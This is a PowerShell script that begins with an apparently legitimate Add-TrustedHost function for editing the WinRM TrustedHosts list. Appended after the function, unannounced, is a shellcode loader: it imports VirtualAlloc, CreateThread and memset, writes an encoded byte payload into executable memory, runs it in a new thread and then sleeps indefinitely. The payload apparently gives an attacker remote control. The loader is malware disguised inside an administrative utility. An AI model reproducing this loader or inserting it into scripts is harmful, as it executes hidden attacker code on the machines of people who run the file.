









function Add-TrustedHost
{
    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact="High")]
    param(
        [Parameter(
            Position=0,
            Mandatory=$true)]
        [String[]]$TrustedHost
    )

    Begin{
        if(-not([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator"))
        {
            throw "Administrator rights are required to add a trusted host!"
        }
    }

    Process{
        $TrustedHost_Path = "WSMan:\localhost\Client\TrustedHosts"
        [System.Collections.ArrayList]$TrustedHosts = @()

        try{
            [String]$TrustedHost_Value = (Get-Item -Path $TrustedHost_Path).Value
            $TrustedHost_Value = (Get-Item -Path $TrustedHost_Path).Value
            $TrustedHost_ValueOrg = $TrustedHost_Value

            if(-not([String]::IsNullOrEmpty($TrustedHost_Value)))
            {
                $TrustedHosts = $TrustedHost_Value.Split(',')
            }
            
            foreach($TrustedHost2 in $TrustedHost)
            {
                if($TrustedHosts -contains $TrustedHost2)
                {
                    Write-Warning -Message "Trusted host ""$TrustedHost2"" already exists in ""$TrustedHost_Path"" and will be skipped."
                    continue
                }

                [void]$TrustedHosts.Add($TrustedHost2)

                $TrustedHost_Value = $TrustedHosts -join ","
            }

            if(($TrustedHost_Value -ne $TrustedHost_ValueOrg) -and ($PSCmdlet.ShouldProcess($TrustedHost_Path)))
            {
                Set-Item -Path $TrustedHost_Path -Value $TrustedHost_Value -Force
            }    
        }
        catch{
            throw
        }
    }

    End{

    }
}
$1Bvb = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $1Bvb -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xc7,0xb8,0x1e,0x40,0x93,0xf4,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x47,0x31,0x43,0x18,0x03,0x43,0x18,0x83,0xc3,0x1a,0xa2,0x66,0x08,0xca,0xa0,0x89,0xf1,0x0a,0xc5,0x00,0x14,0x3b,0xc5,0x77,0x5c,0x6b,0xf5,0xfc,0x30,0x87,0x7e,0x50,0xa1,0x1c,0xf2,0x7d,0xc6,0x95,0xb9,0x5b,0xe9,0x26,0x91,0x98,0x68,0xa4,0xe8,0xcc,0x4a,0x95,0x22,0x01,0x8a,0xd2,0x5f,0xe8,0xde,0x8b,0x14,0x5f,0xcf,0xb8,0x61,0x5c,0x64,0xf2,0x64,0xe4,0x99,0x42,0x86,0xc5,0x0f,0xd9,0xd1,0xc5,0xae,0x0e,0x6a,0x4c,0xa9,0x53,0x57,0x06,0x42,0xa7,0x23,0x99,0x82,0xf6,0xcc,0x36,0xeb,0x37,0x3f,0x46,0x2b,0xff,0xa0,0x3d,0x45,0xfc,0x5d,0x46,0x92,0x7f,0xba,0xc3,0x01,0x27,0x49,0x73,0xee,0xd6,0x9e,0xe2,0x65,0xd4,0x6b,0x60,0x21,0xf8,0x6a,0xa5,0x59,0x04,0xe6,0x48,0x8e,0x8d,0xbc,0x6e,0x0a,0xd6,0x67,0x0e,0x0b,0xb2,0xc6,0x2f,0x4b,0x1d,0xb6,0x95,0x07,0xb3,0xa3,0xa7,0x45,0xdb,0x00,0x8a,0x75,0x1b,0x0f,0x9d,0x06,0x29,0x90,0x35,0x81,0x01,0x59,0x90,0x56,0x66,0x70,0x64,0xc8,0x99,0x7b,0x95,0xc0,0x5d,0x2f,0xc5,0x7a,0x74,0x50,0x8e,0x7a,0x79,0x85,0x3b,0x7e,0xed,0xe6,0x14,0x80,0x8a,0x8e,0x66,0x81,0x55,0xf4,0xee,0x67,0x05,0x5a,0xa1,0x37,0xe5,0x0a,0x01,0xe8,0x8d,0x40,0x8e,0xd7,0xad,0x6a,0x44,0x70,0x47,0x85,0x31,0x28,0xff,0x3c,0x18,0xa2,0x9e,0xc1,0xb6,0xce,0xa0,0x4a,0x35,0x2e,0x6e,0xbb,0x30,0x3c,0x06,0x4b,0x0f,0x1e,0x80,0x54,0xa5,0x35,0x2c,0xc1,0x42,0x9c,0x7b,0x7d,0x49,0xf9,0x4b,0x22,0xb2,0x2c,0xc0,0xeb,0x26,0x8f,0xbe,0x13,0xa7,0x0f,0x3e,0x42,0xad,0x0f,0x56,0x32,0x95,0x43,0x43,0x3d,0x00,0xf0,0xd8,0xa8,0xab,0xa1,0x8d,0x7b,0xc4,0x4f,0xe8,0x4c,0x4b,0xaf,0xdf,0x4c,0xb7,0x66,0x19,0x3b,0xd9,0xba;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$dck=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($dck.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$dck,0,0,0);for (;;){Start-sleep 60};

